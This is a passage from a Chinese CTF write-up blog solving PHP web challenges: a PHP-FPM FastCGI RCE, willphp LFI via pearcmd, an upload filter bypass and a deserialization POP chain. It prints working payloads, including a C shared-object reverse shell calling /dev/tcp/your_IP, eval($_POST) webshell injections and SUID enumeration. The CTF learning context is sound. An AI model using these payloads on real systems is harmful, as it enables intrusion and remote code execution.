<h4 id="0x02-困难的FPM未授权RCE"><a href="#0x02-困难的FPM未授权RCE" class="headerlink" title="0x02:困难的FPM未授权RCE"></a>0x02:困难的FPM未授权RCE</h4><h5 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h5><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p>FastCGI其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<h5 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h5><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p>
<p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/your_IP/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成so文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared shell.c -o shell.so</span><br></pre></td></tr></table></figure>

<p>并上传到html目录下 </p>
<p>在自己的vps上开启一个恶意的ftp服务并创建一个文件用于利用fastcgi访问该ftp服务使得so文件执行成功反弹shell</p>
<p>ftp服务代码以及fastcgi exp都来自Reference，感谢大师傅 我这里就不贴了🥺</p>
<p>开启ftp服务</p>
<p><img src="https://img-blog.csdnimg.cn/ffb80af2b5d440128ee3faceb9c4ac70.png" alt="image-20220621161055962"></p>
<p>监听2333端口，在<code>file.php</code>文件下打payload</p>
<p><img src="https://img-blog.csdnimg.cn/b592a2a086f6469c975a4ed0b96ae5e1.png" alt="image-20220621161202159"></p>
<p>但是没有权限，需要提权，SUID</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d954430e4f4842b9b6d4069966f7e39a.png" alt="image-20220621161831190"></p>
<p>我们可以利用php执行，因为php是以root的权限使用的所以是可以获取到flag的内容的，所以只要绕过<code>open_basedir</code>就好了，之前整理过就直接用了</p>
<p><img src="https://img-blog.csdnimg.cn/7f591661c4364e359e5b26d53bde5a79.png" alt="image-20220621162157303"></p>
<h2 id="HXBCTF-2021-easywill"><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2><h4 id="0x01-简单的链子"><a href="#0x01-简单的链子" class="headerlink" title="0x01:简单的链子"></a>0x01:简单的链子</h4><p>一打开靶场就给了一部分源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">home</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        assign(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> view();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去网络上把<a href="https://www.abnma.com/12216.html">willphp2.1.5</a>下下来了，看这个<code>IndexController</code>就知道我们现在处于这个位置，然后传两个值然后执行<code>assign</code>和<code>view</code>函数，所以该怎么利用就要先去审计一下这两个函数</p>
<p><code>assign</code>简单的赋值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span> = <span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&#x27;&#x27;</span>) <span class="built_in">self</span>::<span class="variable">$_vars</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>view</code>实际调用的是<code>fetch</code></p>
<p><img src="https://img-blog.csdnimg.cn/b052b8d78e924187bd51b259b045ce3a.png" alt="image-20220621164534163"></p>
<p><code>fetch()</code>这里并没有特别的点，直接看最后一个<code>render</code>，渲染，一般就会在渲染的时候实现命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$vars</span> = []</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$vars</span>)) <span class="built_in">self</span>::<span class="variable">$_vars</span> = array_merge(<span class="built_in">self</span>::<span class="variable">$_vars</span>, <span class="variable">$vars</span>);    <span class="comment">// vars为空      </span></span><br><span class="line">   define(<span class="string">&#x27;__THEME__&#x27;</span>, C(<span class="string">&#x27;theme&#x27;</span>));</span><br><span class="line">   define(<span class="string">&#x27;VPATH&#x27;</span>, (THEME_ON)? PATH_VIEW.<span class="string">&#x27;/&#x27;</span>.__THEME__ : PATH_VIEW);  </span><br><span class="line">   <span class="variable">$path</span> = __MODULE__;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$file</span> == <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// 为空</span></span><br><span class="line">      <span class="variable">$file</span> = __ACTION__;</span><br><span class="line">   &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$file</span>, <span class="string">&#x27;:&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">list</span>(<span class="variable">$path</span>,<span class="variable">$file</span>) = explode(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">   &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$file</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$path</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable">$vfile</span> = VPATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$path</span> = strtolower(<span class="variable">$path</span>);</span><br><span class="line">      <span class="variable">$vfile</span> = VPATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">if</span> (!file_exists(<span class="variable">$vfile</span>)) &#123;</span><br><span class="line">      App::halt(<span class="variable">$file</span>.<span class="string">&#x27; 模板文件不存在。&#x27;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      define(<span class="string">&#x27;__RUNTIME__&#x27;</span>, App::getRuntime());  </span><br><span class="line">      array_walk_recursive(<span class="built_in">self</span>::<span class="variable">$_vars</span>, <span class="string">&#x27;self::_parse_vars&#x27;</span>); <span class="comment">//处理输出</span></span><br><span class="line">      \Tple::render(<span class="variable">$vfile</span>, <span class="built_in">self</span>::<span class="variable">$_vars</span>); <span class="comment">// 进行渲染</span></span><br><span class="line">   &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>render</code>这里会对<code>$_vars</code>进行操作的也就只有<code>renderTo</code>，直接跟进<code>renderTo</code>，可以看到在最后会对<code>_vars</code>进行<code>extract</code>直接实现了变量覆盖了说明我们传进去的有<code>name=cfile</code>，而包含我们想要的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$vfile</span>, <span class="variable">$_vars</span> = []</span>) </span>&#123;</span><br><span class="line">   <span class="variable">$shtml_open</span> = C(<span class="string">&#x27;shtml_open&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$shtml_open</span> || basename(<span class="variable">$vfile</span>) == <span class="string">&#x27;jump.shtml&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">self</span>::renderTo(<span class="variable">$vfile</span>, <span class="variable">$_vars</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ……</span><br><span class="line">      <span class="keyword">if</span> (is_file(<span class="variable">$sfile</span>) &amp;&amp; filemtime(<span class="variable">$sfile</span>) &gt; (<span class="variable">$ntime</span> - <span class="variable">$shtml_time</span>)) &#123;</span><br><span class="line">         <span class="keyword">include</span> <span class="variable">$sfile</span>;             </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         ob_start();</span><br><span class="line">         <span class="built_in">self</span>::renderTo(<span class="variable">$vfile</span>, <span class="variable">$_vars</span>);</span><br><span class="line">         <span class="variable">$content</span> = ob_get_contents();</span><br><span class="line">         file_put_contents(<span class="variable">$sfile</span>, <span class="variable">$content</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTo</span>(<span class="params"><span class="variable">$vfile</span>, <span class="variable">$_vars</span> = []</span>) </span>&#123;</span><br><span class="line">   <span class="variable">$m</span> = strtolower(__MODULE__);</span><br><span class="line">   <span class="variable">$cfile</span> = <span class="string">&#x27;view-&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;_&#x27;</span>.basename(<span class="variable">$vfile</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> (basename(<span class="variable">$vfile</span>) == <span class="string">&#x27;jump.html&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable">$cfile</span> = <span class="string">&#x27;view-jump.html.php&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$cfile</span> = PATH_VIEWC.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$cfile</span>;</span><br><span class="line">   <span class="keyword">if</span> (APP_DEBUG || !file_exists(<span class="variable">$cfile</span>) || filemtime(<span class="variable">$cfile</span>) &lt; filemtime(<span class="variable">$vfile</span>)) &#123;</span><br><span class="line">      <span class="variable">$strs</span> = <span class="built_in">self</span>::comp(file_get_contents(<span class="variable">$vfile</span>), <span class="variable">$_vars</span>);</span><br><span class="line">      file_put_contents(<span class="variable">$cfile</span>, <span class="variable">$strs</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   extract(<span class="variable">$_vars</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="variable">$cfile</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h4 id="0x02-困难的LFI"><a href="#0x02-困难的LFI" class="headerlink" title="0x02:困难的LFI"></a>0x02:困难的LFI</h4><p><a href="https://blog.csdn.net/rfrder/article/details/121042290">https://blog.csdn.net/rfrder/article/details/121042290</a></p>
<p>直接用师傅的payload打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ameuu.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/01a38fa88ccd451fa5accc3a39b7dc67.png" alt="image-20220621170201968"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=cfile&amp;value=/tmp/ameuu.php</span><br></pre></td></tr></table></figure>

<p>phpinfo里面什么都没有ban，直接system就好了</p>
<p><img src="https://img-blog.csdnimg.cn/265e822139d24bb0a6605d0463219b83.png" alt="image-20220621170228083"></p>
<h2 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2><p><code>upload.php</code>进行文件上传，会获取图片的大小以及名字来判断是否为图片以及对文件名进行了黑名单过滤</p>
<p>要求图片的width和height都为1可以利用<code>#define width 1</code>绕过</p>
<p>而文件名的绕过，由于<code>urldecode</code>是在判断之前用的，所以不能利用url二次编码绕过，但是看<code>imagePath</code>的时候发现对文件名进行了<code>mb_sretolower</code>操作，这不就可以利用这个绕过嘛</p>
<p>可以利用<a href="https://unicode-table.com/cn/blocks/latin-extended-a/">unicode</a><code>İ</code></p>
<p><img src="https://img-blog.csdnimg.cn/6f3355b2a7dd45dcaad7681108f30fc6.png" alt="image-20220622103403948"></p>
<p>因为是拉丁文，直接放上去的话不会识别出来，可以url编码一下<code>%C4%B0</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从网上找个脚本制作图片马（也可以利用工具就是了</p>
<p>搭一个文件上传，然后把action修改为<code>http://xxxx/upload.php</code>，其他信息也要根据源码给的修改，上传！</p>
<p><img src="https://img-blog.csdnimg.cn/ad6cfe436aa34e25a40ed523bb14a88a.png" alt="image-20220622103839769"></p>
<p><code>example.php</code>中可以对压缩文件进行解压，并且还会将解压后的文件二次渲染放到<code>example/</code>目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接去<code>example/1.php</code>下命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0=system</span><br><span class="line">post:</span><br><span class="line">1=grep -r flag /etc</span><br></pre></td></tr></table></figure>

<h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><ul>
<li>ssrf</li>
<li>pop</li>
</ul>
<p><code>robots.txt</code></p>
<p><code>star1.php</code></p>
<p>ssrf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://c98e5f92-46db-4b2a-8c70-16dadf67dd4a.node4.buuoj.cn:81/star1.php?path=http://127.0.0.1/ser.php</span><br></pre></td></tr></table></figure>

<p><code>ser.php</code>，链子一眼就可以看出来，但是没有入口啊可恶，用arjun爆只有path</p>
<p><img src="https://img-blog.csdnimg.cn/db0bc17b9c7c4a5485d380954123e400.png" alt="image-20220622111524886"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看网上的wp说还存在参数<code>c</code>，那就直接构造吧，利用<code>base64</code>绕过<code>exit()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yongen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=ameuu.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span>; <span class="comment">// eval($_POST[&#x27;cmd&#x27;]);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// public function hasaki()&#123;</span></span><br><span class="line">    <span class="comment">//     $d   = &#x27;<span class="meta">&lt;?php</span> die(&quot;nononon&quot;);&#x27;;</span></span><br><span class="line">    <span class="comment">//     $a= $d. $this-&gt;text;</span></span><br><span class="line">    <span class="comment">//      @file_put_contents($this-&gt; file,$a);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">var_dump(urlencode(serialize(<span class="keyword">new</span> GWHT())));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/54069f39c9d14fcdb8c5ac61b94df38f.png" alt="image-20220622112512327"></p>
<p>访问<code>ameuu.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/79b9d61b9029448e8a2182903832d281.png" alt="image-20220622112537788"></p>
<h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><ul>
<li>nodejs 原型链污染</li>
<li>undefsafe</li>
</ul>
